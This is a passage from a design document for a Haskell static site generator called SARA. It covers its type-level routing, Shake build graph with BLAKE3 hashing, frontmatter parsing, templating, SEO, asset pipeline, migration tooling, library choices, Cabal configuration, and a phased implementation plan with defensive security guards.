  -- Abstract routes (declared in DSL)
  SlugRoute   :: Route 'Abstract
  PrettyRoute :: Route 'Abstract
  RegexRoute
    :: { rrSafeRegex     :: !SafeRegex   -- ^ Validated; no raw Text
       , rrReplacement   :: !Text        -- ^ Plain string; not a regex
       }
    -> Route 'Abstract
  LiteralRoute
    :: { lrPath :: !FilePath }
    -> Route 'Abstract

  -- Resolved routes (produced by the routing engine)
  ResolvedRoute
    :: { resolvedPath :: !FilePath  -- ^ Concrete output path relative to _site/
       }
    -> Route 'Resolved

-- | Apply an abstract route to a concrete source path.
resolveRoute
  :: Route 'Abstract
  -> FilePath          -- ^ Source path
  -> Either (SaraError 'EKRouting) (Route 'Resolved)
```

📌 `RegexRoute` stores a `SafeRegex` (not raw `Text`), ensuring that no unvalidated regex ever reaches the matching engine. The `rrReplacement` is a plain string — it is **never** compiled as a regex.

### 7.4 The `AssetKind` GADT

```haskell
data AssetKind (a :: AssetFormat) where
  ImageAsset   :: ImageSpec -> AssetKind 'FormatImage
  StyleAsset   ::              AssetKind 'FormatCSS
  ScriptAsset  ::              AssetKind 'FormatJS
  FontAsset    ::              AssetKind 'FormatFont
  DataAsset    ::              AssetKind 'FormatData
  GenericAsset ::              AssetKind 'FormatGeneric

data AssetFormat
  = FormatImage
  | FormatCSS
  | FormatJS
  | FormatFont
  | FormatData
  | FormatGeneric

data ImageSpec = ImageSpec
  { imgWidths  :: ![Int]           -- ^ Target widths for responsive images
  , imgFormats :: ![ImageFormat]   -- ^ Output formats
  , imgQuality :: !Int             -- ^ 0-100
  }

data ImageFormat = WebP | AVIF | JPEG | PNG
  deriving (Eq, Show)
```

---

## 8. Core Engine — Shake Build Graph

### 8.1 Rationale for Shake

`Sara.md` specifies Shake explicitly as the build engine. Shake provides:

- **Demand-driven evaluation**: rules are only executed when their outputs are needed.
- **Automatic parallelism**: Shake saturates all available cores with no user configuration.
- **Correct incremental rebuilds**: the oracle pattern integrates cleanly with BLAKE3.
- **First-class error handling**: Shake catches `SomeException` from rule bodies and formats them.

Shake is actively maintained (last release 2024) and used in production by GHC and Haskell Language Server.

### 8.2 BLAKE3 Oracle

Shake's default file-change detection uses `mtime`. `Sara.md` requires BLAKE3 content hashing for correctness (a file whose content is unchanged but whose mtime changed must not trigger a rebuild).

```haskell
-- File: SARA/Internal/Hash.hs

module SARA.Internal.Hash
  ( BLAKE3Oracle
  , addBlake3Oracle  -- :: Rules ()
  , needBlake3       -- :: [FilePath] -> Action ()
  ) where

import Development.Shake
import qualified BLAKE3 as B3   -- 'blake3' package on Hackage

-- | Shake oracle that caches BLAKE3 digests as the change-detection key.
newtype BLAKE3Oracle = BLAKE3Oracle FilePath
  deriving (Show, Typeable, Eq, Hashable, Binary, NFData)

type instance RuleResult BLAKE3Oracle = B3.Hash

addBlake3Oracle :: Rules ()
addBlake3Oracle = addOracle $ \(BLAKE3Oracle path) ->
  liftIO $ B3.hashFile path

needBlake3 :: [FilePath] -> Action ()
needBlake3 paths = do
  _ <- askOracles (map BLAKE3Oracle paths)
  pure ()
```

### 8.3 Build Graph Structure

The Shake build graph for a typical SARA site has the following dependency shape:

```
_site/index.html
    ├── templates/index.html          (via needBlake3)
    ├── _site/posts/2024/hello.html   (transitive: post must be built first)
    │       ├── posts/hello.md        (via needBlake3)
    │       └── templates/post.html   (via needBlake3)
    └── _site/search-index.json       (generated after all posts)

_site/assets/logo.webp
    └── assets/logo.png               (via needBlake3 + image processor)
```

Each arrow represents a `need` call inside a Shake rule. Shake automatically parallelises independent branches.

### 8.4 Hot Rebuild — Sub-50ms Target

The `Sara.md` specification requires hot rebuild in < 50ms for a single file change. To achieve this:

1. BLAKE3 oracle ensures only the changed file's dependents are re-evaluated.
2. Template compilation is cached in a Shake oracle (templates are parsed once; the parsed `Mustache.Template` is stored keyed by content hash).
3. Image processing results are cached by (input path, spec hash) — images are never re-processed unless the source or spec changes.
4. Link checking results are stored in a Shake oracle; only the changed page's outgoing links are re-checked.
5. The security audit (template scan for `{{{ }}}`) is cached by template content hash and only re-run when a template file changes.

---

## 9. Frontmatter & Metadata Pipeline

### 9.1 Universal Frontmatter Parser

`Sara.md` requires support for YAML, TOML, and JSON frontmatter detected **per-file**, not globally.

#### Detection Algorithm

```
If file starts with "---\n" or "---\r\n"  → YAML frontmatter (Jekyll/Hugo style)
If file starts with "+++\n" or "+++\r\n"  → TOML frontmatter (Hugo style)
If file starts with "{\n"  or "{\"       → JSON frontmatter (SARA native)
Otherwise                                 → no frontmatter; empty metadata
```

```haskell
-- File: SARA/Frontmatter/Detect.hs

data FrontmatterFormat
  = FmYAML
  | FmTOML
  | FmJSON
  | FmNone
  deriving (Eq, Show)

-- | O(1): inspect the first bytes only. Handles both LF and CRLF.
detectFormat :: Text -> FrontmatterFormat

splitFrontmatter
  :: FrontmatterFormat
  -> Text
  -> Either (SaraError 'EKFrontmatter) (Text, Text)
  -- ^ Returns (raw frontmatter text, body text)
```

#### Parser Chain

```haskell
-- File: SARA/Frontmatter/Parser.hs

parseFrontmatter
  :: FilePath         -- ^ For error messages
  -> Text             -- ^ Full file content
  -> Either (SaraError 'EKFrontmatter) (Aeson.Object, Text)
  -- ^ (HTML-escaped metadata, body)
  --
  -- Internal pipeline:
  -- 1. detectFormat
  -- 2. splitFrontmatter
  -- 3. parseYAML / parseTOML / parseJSON
  -- 4. convertToAeson (TOML uses 'toml-parser' which emits its own AST)
  -- 5. escapeHtmlValue on all String nodes  ← security step (T-01)
  -- 6. return (Aeson.Object, body)
```

**Libraries:**
- YAML: `yaml` (wraps libyaml; actively maintained)
- TOML: `toml-parser` (pure Haskell; actively maintained as of 2024)
- JSON: `aeson` (standard)

### 9.2 Metadata Remapping

```haskell
-- File: SARA/Frontmatter/Remap.hs

type RemapSpec = [(Text, Text)]  -- [(fromKey, toKey)]

remapMetadata
  :: RemapSpec
  -> FilePath       -- ^ For error context
  -> Aeson.Object
  -> Either (SaraError 'EKFrontmatter) Aeson.Object
-- ^ Renames keys. If 'fromKey' is absent, returns FrontmatterRemapMissing.
-- ^ If 'toKey' already exists, the existing value is preserved (no overwrite).
```

📌 When both `fromKey` and `toKey` exist simultaneously, `toKey` wins and `fromKey` is removed. This avoids duplicated metadata in templates.

---

## 10. Routing & URL Preservation Engine

### 10.1 Route Types

The routing engine resolves abstract `Route 'Abstract` values declared in the DSL into concrete `Route 'Resolved` output paths. See §7.3.

### 10.2 Regex Route — Correctness Requirements

`Sara.md` specifies regex-based route mirroring to preserve legacy URL structures. The implementation must:

1. **Construct a `SafeRegex` at rule-construction time** via `mkSafeRegex` (§6.5). An invalid or ReDoS-dangerous regex halts the build before any files are processed.
2. **Detect route conflicts** before any output is written. Two source files mapping to the same output path is a fatal `RouteConflict` error.
3. **Preserve trailing slash behaviour**: `/year/month/day/title/` (directory-style) must be preserved if the original URL had it.

```haskell
-- File: SARA/Routing/Engine.hs

-- | Smart constructor: validates and checks for ReDoS at construction time.
--   Returns the compiled 'SafeRegex' inside the 'Route 'Abstract'.
regexRoute
  :: Text    -- ^ Input pattern  (e.g. "/posts/([0-9]{4})/(.*)")
  -> Text    -- ^ Replacement    (e.g. "/archives/\\1/\\2")
  -> Either (SaraError 'EKSecurity) (Route 'Abstract)
  -- ^ Note: error kind is 'EKSecurity for ReDoS; 'EKRouting for invalid syntax.
  --   Callers should handle both via 'AnySaraError'.

slugRoute  :: Route 'Abstract
prettyRoute :: Route 'Abstract

detectRouteConflicts
  :: [(FilePath, Route 'Resolved)]
  -> [SaraError 'EKRouting]
```

---

## 11. Template & Rendering Subsystem

### 11.1 Template Engine Selection

The architectural choice is **Mustache** via the `stache` library.

**Rationale:**
- Mustache is logic-less by design, enforcing separation of data and presentation.
- `stache` is actively maintained, pure Haskell, and integrates natively with `aeson`.
- `{{ variable }}` is HTML-escaped by default — secure by default.
- `{{{ variable }}}` opts out of escaping — audited and restricted by §6.2.
- Designers familiar with Jinja2/Liquid (Jekyll) find Mustache natural.

📌 **Alternative considered**: `heist` (Snap's template engine). Rejected because it requires XML-based templates, increasing migration burden from Jekyll/Hugo.

### 11.2 Template Compilation Cache

```haskell
-- File: SARA/Template/Renderer.hs

newtype TemplateOracle = TemplateOracle FilePath
  deriving (Show, Typeable, Eq, Hashable, Binary, NFData)

type instance RuleResult TemplateOracle = Mustache.Template

addTemplateOracle :: Rules ()
-- ^ Registers the oracle. Compilation includes the security audit
--   (auditTemplateForRawInterpolation) as a mandatory step.
--   A template that fails the audit is not compiled; the build halts.

renderTemplate
  :: FilePath          -- ^ Template path
  -> Aeson.Value       -- ^ Context (pre-escaped metadata + global config)
  -> Action (Either (SaraError 'EKTemplate) Text)
```

### 11.3 Context Assembly

```haskell
assembleContext
  :: SaraConfig      -- ^ Global config
  -> Item 'Validated -- ^ Fully validated item (metadata already HTML-escaped)
  -> Aeson.Value     -- ^ Merged context ready for template rendering
-- Priority (highest first):
-- 1. Item-level metadata (from frontmatter, already HTML-escaped at parse time)
-- 2. Global site metadata (from sara.yaml, HTML-escaped at config load time)
-- 3. SARA-injected fields (sara.url, sara.buildTime, sara.version,
--                          sara.jsonLD, sara.ogTags, sara.twitterTags)
--    These are generated by SARA and are safe for {{{ }}} interpolation.
```

---

## 12. SEO Intelligence Layer

### 12.1 JSON-LD Generation

SARA generates Schema.org `Article` (for posts) and `WebSite` (for the index) JSON-LD blocks automatically.

```haskell
-- File: SARA/SEO/JsonLD.hs

data SchemaType = SchemaArticle | SchemaWebSite | SchemaWebPage
  deriving (Eq, Show)

generateJsonLD
  :: SchemaType
  -> Aeson.Object    -- ^ Item metadata (pre-escaped)
  -> SaraConfig
  -> Aeson.Value     -- ^ JSON-LD @graph node
-- ^ Output injected as {{ sara.jsonLD }} (a pre-serialised
--   <script type="application/ld+json">...</script> block).
--   Injected via {{{ sara.jsonLD }}} in templates — this is the
--   whitelisted use of raw interpolation (see §6.2).
```

Required metadata fields mapped to Schema.org:

| SARA metadata key | Schema.org property | Fallback behaviour |
|-------------------|--------------------|--------------------|
| `title` | `headline` | Build warning (`AuditWarn`) |
| `date` | `datePublished` | Build warning (`AuditWarn`) |
| `author` | `author.name` | Site-level author from config |
| `description` | `description` | First 160 chars of body (plain text) |
| `image` | `image` | Site-level OG image from config |

### 12.2 OpenGraph & Twitter Card Tags

```haskell
-- File: SARA/SEO/OpenGraph.hs

generateOGTags
  :: Aeson.Object
  -> SaraConfig
  -> [(Text, Text)]  -- ^ (property, content) pairs

generateTwitterTags
  :: Aeson.Object
  -> SaraConfig
  -> [(Text, Text)]
-- ^ Injected as {{ sara.ogTags }} and {{ sara.twitterTags }}.
--   Pre-rendered as HTML <meta> strings by SARA before injection,
--   so {{{ }}} is safe for these fields specifically.
```

### 12.3 SEO Audit Engine

```haskell
-- File: SARA/SEO/Audit.hs

data AuditResult
  = AuditPassed
  | AuditIssues ![AnySaraError]
  deriving (Eq, Show)

auditRenderedHTML
  :: AuditLevel      -- ^ Configurable per-category in sara.yaml
  -> FilePath        -- ^ Source file (for error messages)
  -> Text            -- ^ Rendered HTML
  -> AuditResult

-- Checks performed (in order):
-- 1. All <img> elements have non-empty alt= attributes.
-- 2. Heading hierarchy: h1 → h2 → h3 (no skipping levels).
-- 3. Exactly one <h1> per page (warn if zero; fail if >1).
-- 4. <title> is non-empty.
-- 5. <meta name="description"> is present and non-empty.
```

---

## 13. Asset Pipeline

### 13.1 Auto-Discovery

```haskell
-- File: SARA/Asset/Discover.hs

-- | Called as: discover (mkGlobPattern "assets/**")
discoverAssets
  :: GlobPattern   -- ^ Safe glob (not raw Text)
  -> SaraM ()

inferAssetKind :: FilePath -> SomeAssetKind
-- ^ .png .jpg .jpeg .gif .svg → ImageAsset (default spec)
--   .css .scss                → StyleAsset
--   .js .mjs                  → ScriptAsset
--   .woff .woff2 .ttf         → FontAsset
--   .json .xml .csv           → DataAsset
--   everything else           → GenericAsset
```

### 13.2 Image Processing

```haskell
-- File: SARA/Asset/Image.hs

processImage
  :: ImageSpec
  -> SafePath      -- ^ Input (path-guarded)
  -> SafePath      -- ^ Output directory (path-guarded)
  -> Action ()

-- Implementation:
-- 1. Decode with JuicyPixels (pure Haskell; no system libimage dependency).
-- 2. Resize with JuicyPixels' bilinear/bicubic filter.
-- 3. Encode PNG/JPEG with JuicyPixels.
-- 4. WebP: safeCmd "cwebp" ["-q", "80", input, "-o", output]
-- 5. AVIF: safeCmd "avifenc" [input, output]
-- All shell-outs via 'safeCmd' (§6.4); never string-interpolated.
```

⚠️ Pure Haskell WebP/AVIF encoders do not exist as actively maintained Hackage packages as of 2025. System binaries are the correct approach, consistent with Hugo and Zola. Shell safety is guaranteed by `safeCmd`.

---

## 14. Link & Asset Validator

### 14.1 Internal Link Validation

```haskell
-- File: SARA/Validator/LinkChecker.hs

type SiteGraph = HashSet FilePath

checkInternalLinks
  :: SiteGraph
  -> FilePath
  -> Text            -- ^ Rendered HTML
  -> [SaraError 'EKValidator]

-- Algorithm:
-- 1. Parse all href= attributes using tagsoup.
-- 2. Discard: absolute URLs (http/https), anchors (#...), mailto:, tel:
-- 3. Normalise remaining paths relative to the output root.
-- 4. Check membership in SiteGraph.
-- 5. Emit ValidatorBrokenLink for each miss.
```

### 14.2 Asset Validation

```haskell
-- File: SARA/Validator/AssetChecker.hs

checkAssetReferences
  :: SiteGraph
  -> FilePath
  -> Text
  -> [SaraError 'EKValidator]
-- Checks: src= (img, script, video, audio, source),
--         href= (link rel=stylesheet), data-src= (lazy loading).
```

---

## 15. Migration Toolchain (`sara import`)

### 15.1 Source Detection

```haskell
-- File: SARA/Migration/Detect.hs

data SourceSSG
  = SourceJekyll
  | SourceHugo
  | SourceHakyll
  | SourceUnknown
  deriving (Eq, Show)

detectSourceSSG :: FilePath -> IO SourceSSG
-- Heuristics:
-- Jekyll:  _config.yml + _posts/
-- Hugo:    config.toml/yaml with 'baseURL' + content/
-- Hakyll:  site.hs + _site/ + posts/
-- Unknown: none of the above
```

### 15.2 Shortcode Translation

```haskell
-- File: SARA/Migration/Jekyll.hs

translateJekyllShortcodes
  :: FilePath
  -> Text
  -> Either (SaraError 'EKMigration) Text

-- Supported:
-- {% post_url slug %}   → [slug](/posts/slug/)
-- {% link path %}       → [path](/path)
-- {% highlight lang %}  → ```lang
-- {% endhighlight %}    → ```
-- Unsupported           → MigrationUnsupportedShortcode (AuditWarn, not fail)
```

### 15.3 The `sara import` CLI Command

```
sara import <source-directory> [--output <new-project-directory>]
            [--from jekyll|hugo|hakyll|auto]
            [--remap key=value ...]
```

The importer:
1. Detects source SSG.
2. Copies all content files via `guardPath`-checked operations (no path traversal possible).
3. Translates shortcodes in-place.
4. Generates `sara.yaml` with detected settings.
5. Generates `site.hs` with `remapMetadata`, `discover`, and `match` rules pre-populated.
6. Reports untranslatable shortcodes as `MigrationUnsupportedShortcode` warnings with file + line.

---

## 16. Live Reload — WebSocket Server

### 16.1 Architecture

```haskell
-- File: SARA/LiveReload/Server.hs

data DevServer = DevServer
  { dsPort      :: !Int
  , dsSiteDir   :: !SafePath     -- ^ Path-guarded site output directory
  , dsBroadcast :: !(TChan Text) -- ^ "reload" messages to WebSocket clients
  }

startDevServer :: SaraConfig -> SafePath -> IO ()
-- 1. Compile and inject LiveReload JS snippet before </body>.
-- 2. Start Warp on dsPort (localhost only; not bound to 0.0.0.0 by default).
-- 3. Start WebSocket upgrade handler.
-- 4. Start fsnotify watcher.
-- 5. On file change: trigger Shake incremental build, then broadcast "reload".
```

🔒 The dev server binds to `127.0.0.1` by default, not `0.0.0.0`. Binding to all interfaces requires an explicit `--bind 0.0.0.0` flag. This prevents accidental exposure of the development server on a shared network.

---

## 17. Search Index Generation

```haskell
-- File: SARA/Search/Index.hs

data SearchEntry = SearchEntry
  { seUrl     :: !Text
  , seTitle   :: !Text
  , seContent :: !Text    -- ^ Plain text; HTML-stripped via tagsoup
  , seMeta    :: !Aeson.Object
  } deriving (Show, Generic)
    deriving anyclass (Aeson.ToJSON)

generateSearchIndex
  :: [SearchEntry]
  -> SafePath          -- ^ Output path (path-guarded)
  -> Action ()
```

📌 The search index contains plain text stripped of HTML. Because this content has already been HTML-escaped at the frontmatter stage, the plain-text extraction is safe (it strips tags, not injects them).

---

## 18. SARA DSL Design

### 18.1 The `SaraM` Monad

```haskell
-- File: SARA/Monad.hs

newtype SaraM a = SaraM
  { unSaraM :: ReaderT SaraEnv (WriterT [RuleDecl] (ExceptT [AnySaraError] IO)) a
  } deriving (Functor, Applicative, Monad)

data SaraEnv = SaraEnv
  { envConfig    :: !SaraConfig
  , envRoot      :: !ProjectRoot   -- ^ Established at startup; used by all PathGuard calls
  , envSiteGraph :: !(IORef SiteGraph)
  -- ^ Accumulates resolved routes. This is the ONLY permitted IORef in SARA.
  -- ^ Justification: Shake's parallel rule execution requires mutable accumulation
  --   of the site graph; STM TChan or MVar would be equivalent but heavier.
  }

data RuleDecl
  = RuleMatch    !GlobPattern !(FilePath -> SaraM ())
  | RuleDiscover !GlobPattern
  | RuleGlobal   !(SaraM ())
```

### 18.2 DSL Combinators

```haskell
-- | Entry point. Runs the SaraM computation, translates to Shake, executes.
sara :: SaraM () -> IO ()

-- | Match source files by glob.
match
  :: GlobPattern                       -- ^ Validated glob (not raw Text)
  -> (FilePath -> SaraM (Item 'Validated))
  -> SaraM [Item 'Validated]

-- | Auto-discover and copy/process assets.
discover :: GlobPattern -> SaraM ()   -- ^ Validated glob (not raw Text)

-- | Apply a route to the current item.
route :: Route 'Abstract -> Item 'Unvalidated -> Either (SaraError 'EKRouting) (Item 'Unvalidated)

-- | Read and parse a Markdown file, returning an unvalidated Item.
--   Internally calls 'guardPath' and 'escapeHtmlValue'.
readMarkdown :: FilePath -> SaraM (Item 'Unvalidated)

-- | Validate SEO properties. Returns a Validated Item or halts.
validateSEO :: Item 'Unvalidated -> SaraM (Item 'Validated)

-- | Render an Item through a template.
--   Template is audited for {{{ }}} on first use (cached thereafter).
render :: FilePath -> Item 'Validated -> SaraM ()

-- | Register metadata remapping rules.
remapMetadata :: [(Text, Text)] -> SaraM ()

-- | Smart constructor for regex routes. Validated and ReDoS-checked.
regexRoute :: Text -> Text -> SaraM (Route 'Abstract)
```

### 18.3 Alignment with `Sara.md` DSL Example

The DSL example from `Sara.md` maps exactly to the combinators above:

```haskell
import SARA

main = sara $ do
    remapMetadata [("published_at", "date")]

    -- 'discover' takes a GlobPattern, not raw Text.
    -- The DSL provides 'glob' as a convenience that calls mkGlobPattern.
    discover (glob "assets/*")

    posts <- match (glob "posts/*.md") $ \file -> do
        item  <- readMarkdown file    -- guardPath + escapeHtmlValue called here
        item' <- validateSEO item
        r     <- regexRoute "/posts/([0-9]{4})/(.*)" "/archives/\\1/\\2"
        render "templates/post.html" item'
        pure item'

    match (glob "index.html") $ \_ -> do
        render "templates/index.html" (object ["posts" .= posts])

-- 'glob' is a DSL convenience that calls mkGlobPattern and
-- throws a build-time error (not a runtime exception) on invalid input.
glob :: Text -> GlobPattern
glob t = case mkGlobPattern t of
  Right p -> p
  Left  e -> error (Text.unpack (renderError (AnySaraError e)))
  -- The 'error' here is in user-space site.hs, not in the SARA library.
  -- Library code never calls 'error'.
```

---

## 19. Library Selection — Rationale & Constraints

All libraries below are verified on Hackage as actively maintained as of 2025.

| Subsystem | Library | Version (approx) | Notes |
|-----------|---------|---------|-------|
| Build graph | `shake` | ≥ 0.19 | Mandatory per `Sara.md` |
| Content hashing | `blake3` | ≥ 0.2 | Pure Haskell bindings to the reference impl |
| JSON | `aeson` | ≥ 2.2 | Universal metadata representation |
| YAML parsing | `yaml` | ≥ 0.11 | Wraps libyaml |
| TOML parsing | `toml-parser` | ≥ 1.3 | Pure Haskell; correct per TOML 1.0 spec |
| Markdown | `cmark-gfm` | ≥ 0.2 | Bindings to libcmark-gfm; GFM extensions |
| Templates | `stache` | ≥ 2.3 | Mustache; HTML-escapes by default |
| Regex | `regex-pcre-builtin` | ≥ 0.95 | PCRE; validated + ReDoS-checked via `SafeRegex` |
| HTML parsing | `tagsoup` | ≥ 0.14 | Streaming; for link/SEO/security auditing |
| Image processing | `JuicyPixels` | ≥ 3.3 | Pure Haskell decode/encode/resize |
| HTTP server | `warp` | ≥ 3.3 | Dev server; localhost-only by default |
| WebSockets | `websockets` | ≥ 0.12 | Live reload push |
| File watching | `fsnotify` | ≥ 0.4 | Cross-platform inotify/FSEvents/kqueue |
| CLI | `optparse-applicative` | ≥ 0.18 | Actively maintained |
| Pretty printing | `prettyprinter` | ≥ 1.7 | Structured error rendering |
| ANSI colour | `prettyprinter-ansi-terminal` | ≥ 1.1 | Coloured diagnostics |
| Concurrency | `stm` | GHC bundled | TChan for WebSocket broadcast |
| Glob patterns | `filepattern` | ≥ 0.1 | Shake's own glob library; used by `GlobPattern` |
| Property testing | `QuickCheck` | ≥ 2.14 | Per `Sara.md` QA requirements |
| Unit testing | `hspec` | ≥ 2.11 | With `hspec-discover` |
| Benchmarking | `criterion` | ≥ 1.6 | For the 10k Post Test |
| Text processing | `text` | GHC bundled | `Text` everywhere; no `String` in library code |
| ByteString | `bytestring` | GHC bundled | For zero-copy IO |

### Text Discipline

🔒 **`String` is banned in all SARA library modules**. All text is `Data.Text.Text` or `Data.ByteString.ByteString`. The only permitted `String` usage is the `FilePath` type alias (which is `[Char]` in GHC base), and only because Shake and filesystem APIs require it. `GHC2021` and `-Wall` will flag accidental `String` usage.

### Banned Functions

🔒 The following functions and modules are banned in SARA library code and enforced via HLint rules:

| Banned | Reason | Safe alternative |
|--------|--------|-----------------|
| `System.Process.callCommand` | Shell injection | `SARA.Security.ShellGuard.safeCmd` |
| `System.Process.system` | Shell injection | `SARA.Security.ShellGuard.safeCmd` |
| `System.Process.rawSystem` | Shell injection | `SARA.Security.ShellGuard.safeCmd` |
| `Prelude.error` (in library) | Silent failure | `ExceptT` with typed error |
| `Prelude.undefined` (in library) | Silent failure | `ExceptT` with typed error |
| `Data.List.head` (partial) | Unsafe | Pattern match or `NonEmpty` |
| `Data.List.tail` (partial) | Unsafe | Pattern match or `NonEmpty` |
| `Data.Map.!` (partial lookup) | Unsafe | `Data.Map.lookup` |

---

## 20. Project Layout

```
sara/
├── sara.cabal
├── cabal.project
├── cabal.project.freeze          -- Pin exact dependency versions for reproducibility
├── .hlint.yaml                   -- HLint rules enforcing banned functions
├── stack.yaml                    -- For users who prefer Stack
├── src/
│   └── (as per Module Topology in §4)
├── test/
│   └── (unit + property + security tests)
├── bench/
│   └── (criterion benchmarks)
├── templates/
│   ├── default.html              -- No {{{ }}} except sara.* fields
│   ├── post.html
│   └── index.html
├── docs/
│   ├── ARCHITECTURE.md           -- This document
│   ├── MIGRATION.md
│   ├── ERRORS.md
│   ├── SECURITY.md               -- Public-facing security disclosure policy
│   └── QUICKSTART.md
├── examples/
│   ├── blog/
│   └── portfolio/
└── CHANGELOG.md
```

---

## 21. Cabal Configuration

```cabal
cabal-version:      3.4
name:               sara
version:            0.1.0.0
synopsis:           Simple, Adaptive, Responsive Architecture — Industrial Haskell SSG
description:
  SARA is a high-performance static site generator built on Shake.
  It provides type-safe routing, universal frontmatter parsing,
  human-first error messages, security-by-construction, and migration
  tools for Jekyll/Hugo/Hakyll.
license:            BSD-3-Clause
author:             SARA Contributors
maintainer:         maintainer@sara-ssg.dev
category:           Web, Development
build-type:         Simple
extra-source-files:
  templates/**/*.html
  docs/*.md
  .hlint.yaml

common warnings
  ghc-options:
    -Wall
    -Wcompat
    -Widentities
    -Wincomplete-record-updates
    -Wincomplete-uni-patterns
    -Wmissing-export-lists
    -Wno-unused-do-bind
    -Wredundant-constraints
    -Wpartial-fields
    -fhide-source-paths

-- CI-only stanza: applied in cabal.project.ci (not the default build)
-- to avoid breaking user overrides.
-- cabal.project.ci contains:
--   package sara
--     ghc-options: -Werror
-- This ensures the CI pipeline treats every warning as a fatal error,
-- enforcing the zero-warning policy without affecting end-user builds.

library
  import:             warnings
  hs-source-dirs:     src
  default-language:   GHC2021
  default-extensions:
    DataKinds
    GADTs
    KindSignatures
    LambdaCase
    OverloadedStrings
    ScopedTypeVariables
    StrictData
    TupleSections
    TypeFamilies
  exposed-modules:
    SARA
    SARA.Error
    SARA.Config
    SARA.Types
    SARA.Monad
    SARA.DSL
    SARA.Security.PathGuard
    SARA.Security.GlobGuard
    SARA.Security.RegexGuard
    SARA.Security.HtmlEscape
    SARA.Security.ShellGuard
  other-modules:
    SARA.Internal.Planner
    SARA.Internal.Engine
    SARA.Internal.Hash
    SARA.Security.Error
    SARA.Frontmatter.Error
    SARA.Frontmatter.Detect
    SARA.Frontmatter.Parser
    SARA.Frontmatter.Remap
    SARA.Routing.Error
    SARA.Routing.Types
    SARA.Routing.Engine
    SARA.Markdown.Error
    SARA.Markdown.Parser
    SARA.Markdown.Shortcode
    SARA.Template.Error
    SARA.Template.Renderer
    SARA.SEO.Error
    SARA.SEO.JsonLD
    SARA.SEO.OpenGraph
    SARA.SEO.Audit
    SARA.Validator.Error
    SARA.Validator.LinkChecker
    SARA.Validator.AssetChecker
    SARA.Asset.Error
    SARA.Asset.Discover
    SARA.Asset.Image
    SARA.Asset.Copy
    SARA.Search.Index
    SARA.LiveReload.Server
    SARA.LiveReload.Watcher
    SARA.Migration.Error
    SARA.Migration.Detect
    SARA.Migration.Jekyll
    SARA.Migration.Hugo
    SARA.Migration.Scaffold
  build-depends:
    base                     >= 4.18  && < 5,
    aeson                    >= 2.2   && < 2.3,
    blake3                   >= 0.2   && < 0.3,
    bytestring               >= 0.11  && < 0.13,
    cmark-gfm                >= 0.2   && < 0.3,
    filepattern              >= 0.1   && < 0.2,
    filepath                 >= 1.4   && < 1.5,
    fsnotify                 >= 0.4   && < 0.5,
    JuicyPixels              >= 3.3   && < 3.4,
    optparse-applicative     >= 0.18  && < 0.19,
    prettyprinter            >= 1.7   && < 1.8,
    prettyprinter-ansi-terminal >= 1.1 && < 1.2,
    regex-pcre-builtin       >= 0.95  && < 0.96,
    shake                    >= 0.19  && < 0.20,
    stache                   >= 2.3   && < 2.4,
    stm                      >= 2.5   && < 2.6,
    tagsoup                  >= 0.14  && < 0.15,
    text                     >= 2.0   && < 2.2,
    toml-parser              >= 1.3   && < 2.0,
    unordered-containers     >= 0.2   && < 0.3,
    warp                     >= 3.3   && < 3.4,
    websockets               >= 0.12  && < 0.13,
    yaml                     >= 0.11  && < 0.12,
    directory                >= 1.3   && < 1.4

executable sara
  import:           warnings
  main-is:          Main.hs
  hs-source-dirs:   app
  default-language: GHC2021
  build-depends:
    base, sara, optparse-applicative, text

test-suite sara-test
  import:           warnings
  type:             exitcode-stdio-1.0
  main-is:          Spec.hs
  hs-source-dirs:   test
  default-language: GHC2021
  build-tool-depends: hspec-discover:hspec-discover
  build-depends:
    base, sara,
    hspec          >= 2.11 && < 2.12,
    QuickCheck     >= 2.14 && < 2.15,
    aeson,
    text,
    filepath,
    directory,
    temporary      >= 1.3  && < 1.4

benchmark sara-bench
  import:           warnings
  type:             exitcode-stdio-1.0
  main-is:          Main.hs
  hs-source-dirs:   bench
  default-language: GHC2021
  build-depends:
    base, sara,
    criterion      >= 1.6  && < 1.7,
    text,
    filepath,
    temporary
```

### The `cabal.project.ci` File

```cabal
-- cabal.project.ci — used in CI pipelines only.
-- Apply with: cabal build --project-file=cabal.project.ci

import: cabal.project

package sara
  ghc-options: -Werror
```

🔒 `-Werror` is **mandatory in CI**. Every GHC warning is treated as a build failure in the CI pipeline. This prevents warning accumulation and enforces the zero-warning policy without restricting developer builds.

---

## 22. Implementation Guide — Phase-by-Phase

### Phase 0: Foundation (Week 1)

**Deliverable**: Project compiles with empty stubs. Error, security, and type modules are complete.

**Tasks:**

1. Initialise the Cabal project. Add all dependencies. Confirm `cabal build` succeeds.
2. Implement `SARA/Error.hs` completely — GADT, `AnySaraError`, `AuditLevel`, `renderError`, `renderErrorColor`. Include `EKSecurity` constructors.
3. Implement `SARA/Types.hs`: `ValidationState`, `Item`, `RouteState`, `Route`, `AssetFormat`, `AssetKind`, `GlobPattern` newtype stub.
4. Implement `SARA/Config.hs`: `SaraConfig`, `ProjectRoot`.
5. Implement `SARA/Monad.hs`: `SaraM`, `SaraEnv` (with `envRoot :: ProjectRoot`), `RuleDecl`.

**Exit criteria**: `cabal build` and `cabal test` pass with 0 failures. Error rendering produces correct multi-line output for each constructor family.

---

### Phase 1: Security Layer (Week 1–2)

> 🔒 The security layer is built **before** any other subsystem. All subsequent phases depend on it.

**Deliverable**: `PathGuard`, `GlobGuard`, `RegexGuard`, `HtmlEscape`, and `ShellGuard` are complete with full test coverage.

**Tasks:**

1. Implement `SARA/Security/PathGuard.hs`. `guardPath` uses `System.Directory.canonicalizePath`. Write 8 unit tests (see §6.3 test requirements).
2. Implement `SARA/Security/GlobGuard.hs`. `mkGlobPattern` rejects patterns containing `..` or absolute path components. Write 6 unit tests.
3. Implement `SARA/Security/RegexGuard.hs`. Structural ReDoS check (nested quantifier detection). Write 10 unit tests covering safe and dangerous patterns (see §6.5 test requirements).
4. Implement `SARA/Security/HtmlEscape.hs`. `escapeHtmlValue` and `auditTemplateForRawInterpolation`. Write 8 unit tests (see §6.2 test requirements).
5. Implement `SARA/Security/ShellGuard.hs`. `safeCmd` wraps Shake's `cmd` in list form. Write 4 unit tests.
6. Add QuickCheck property: `guardPath root p` never returns `Right` for a path outside `root`, for any `p` in the generator's output. This property must hold for at least 10,000 random inputs.
7. Create `.hlint.yaml` with rules banning `callCommand`, `system`, `rawSystem`, `error`, `undefined`, `head`, `tail` in library modules.

**Exit criteria**: `cabal test` passes including all security tests. HLint reports zero violations on `src/`.

---

### Phase 2: Frontmatter Pipeline (Week 2)

**Tasks:**

1. Implement `SARA/Frontmatter/Detect.hs`. Handle both LF and CRLF.
